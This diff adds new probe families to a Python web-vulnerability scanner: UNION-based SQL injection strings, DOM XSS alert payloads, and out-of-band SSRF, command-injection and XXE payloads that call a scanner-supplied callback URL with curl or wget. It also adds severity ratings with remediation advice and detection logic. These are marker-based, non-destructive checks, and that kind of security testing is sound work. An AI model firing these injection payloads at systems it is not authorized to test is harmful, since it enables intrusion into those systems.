@@ -85,6 +85,51 @@ LFI_WRAPPER = [
 CRLF = [f"%0d%0aX-Ygg-Inj:{CANARY}", f"%0aX-Ygg-Inj:{CANARY}",
         f"%E5%98%8a%E5%98%8dX-Ygg-Inj:{CANARY}"]
 
+# UNION-based SQLi: recover data through an appended UNION SELECT of a unique marker
+# across column counts. A hit means the marker came back as a *row* (extraction),
+# not raw reflection (hence the "payload not reflected" guard in evaluate()).
+UNION_MARKER = "yggu9k3mark"
+SQLI_UNION = [
+    f"' UNION SELECT '{UNION_MARKER}'-- -",
+    f"' UNION SELECT '{UNION_MARKER}',NULL-- -",
+    f"' UNION SELECT NULL,'{UNION_MARKER}'-- -",
+    f"' UNION SELECT '{UNION_MARKER}',NULL,NULL-- -",
+    f"' UNION SELECT NULL,'{UNION_MARKER}',NULL-- -",
+    f"-1' UNION SELECT '{UNION_MARKER}'-- -",
+    f"') UNION SELECT '{UNION_MARKER}'-- -",
+]
+
+# DOM XSS: execution-proving payloads for the headless-browser pass. Each calls
+# alert(DOM_MARKER); a fired dialog carrying the marker proves JavaScript executed
+# (catches DOM-only sinks that never appear in the server response).
+DOM_MARKER = "yggdom5150"
+
+
+def dom_payloads():
+    m = DOM_MARKER
+    return [
+        f'"><img src=x onerror=alert("{m}")>',
+        f'<img src=x onerror=alert("{m}")>',
+        f'<svg onload=alert("{m}")>',
+        f'<img src=x onerror=alert`{m}`>',
+        f"javascript:alert('{m}')",
+        f"';alert('{m}')//",
+        f'"-alert("{m}")-"',
+        f'</script><script>alert("{m}")</script>',
+    ]
+
+
+def oob_payloads(callback_url: str):
+    """Out-of-band (OAST) payloads that make a vulnerable target reach out to our
+    listener at `callback_url` — confirming blind SSRF / command injection / XXE that
+    produce no visible response. Non-destructive (a GET to our own URL)."""
+    return {
+        "ssrf": [callback_url],
+        "cmdi": [f";curl {callback_url}", f"|curl {callback_url}", f"$(curl {callback_url})",
+                 f"`curl {callback_url}`", f"& curl {callback_url}", f";wget -qO- {callback_url}"],
+        "xxe": [f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{callback_url}">]><r>&x;</r>'],
+    }
+
 SQL_ERROR_SIGNATURES = (
     "sql syntax", "mysql_fetch", "you have an error in your sql", "ora-0",
     "psql:", "sqlite", "sqlstate", "pdoexception", "microsoft ole db", "odbc",
@@ -101,6 +146,14 @@ _META = {
                     "A boolean SQL condition changed the response deterministically (TRUE mirrored the page, FALSE diverged), confirming blind SQL injection — data can be extracted a bit at a time."),
     "sqli_time":   ("high", 8.6, "Use parameterized queries; the parameter reaches the SQL engine unfiltered.",
                     "A time-delay payload made the response hang, confirming blind SQL injection: the parameter reaches the SQL engine and an attacker can extract data by timing."),
+    "sqli_union":  ("critical", 9.1, "Use parameterized queries; the parameter is concatenated into a UNION-able query.",
+                    "An appended UNION SELECT returned attacker-chosen data as a result row, confirming UNION-based SQL injection with direct data extraction."),
+    "dom_xss":     ("high", 7.7, "Sanitize/encode before writing to DOM sinks (innerHTML, document.write, eval); apply a strict CSP.",
+                    "A payload executed JavaScript in a headless browser, confirming XSS with real execution (including DOM-based sinks that never appear in the server response)."),
+    "oob_ssrf":    ("high", 8.6, "Allowlist outbound hosts/schemes; block internal/link-local addresses; resolve+validate before fetch.",
+                    "A parameter caused the server to make an out-of-band request to our listener, confirming blind server-side request forgery."),
+    "oob_cmdi":    ("critical", 9.8, "Never pass input to a shell; use exec with an argument array and an allowlist.",
+                    "An injected shell command reached our out-of-band listener, confirming blind OS command injection with no visible output."),
     "xss":         ("high", 7.4, "Context-aware output encoding + a strict Content-Security-Policy.",
                     "An injected HTML/script payload was reflected unencoded, letting an attacker run arbitrary JavaScript in a victim's browser (session theft, credential harvesting)."),
     "stored_xss":  ("high", 8.0, "Encode on output everywhere the value renders; apply a strict CSP.",
@@ -137,6 +190,7 @@ def probe_families(include_time: bool = True):
     Boolean-based blind and stored XSS are multi-request and driven by the engine."""
     plan = []
     for p in SQLI_ERROR:   plan.append(("sqli_error", p))
+    for p in SQLI_UNION:   plan.append(("sqli_union", p))
     for p in XSS:          plan.append(("xss", p))
     for p in SSTI:         plan.append(("ssti", p))
     for p in CMDI:         plan.append(("cmdi", p))
@@ -189,6 +243,11 @@ def evaluate(family, payload, resp_text, status=200, elapsed=None, resp_headers=
         if elapsed is not None and base_elapsed is not None and elapsed >= 5.0 and (elapsed - base_elapsed) >= 4.0:
             return _v("sqli_time", "SQL Injection (time-based blind)",
                       f"Response delayed {elapsed:.1f}s vs {base_elapsed:.1f}s baseline for {payload!r}")
+
+    elif family == "sqli_union":
+        if UNION_MARKER in text and UNION_MARKER not in base_low and payload not in text:
+            return _v("sqli_union", "SQL Injection (UNION-based, data extraction)",
+                      f"UNION SELECT returned the marker as a data row for {payload!r} (HTTP {status})")
 
     elif family == "xss":
         trig = ("<" in payload or "javascript:" in payload or re.search(r"on\w+=", payload))
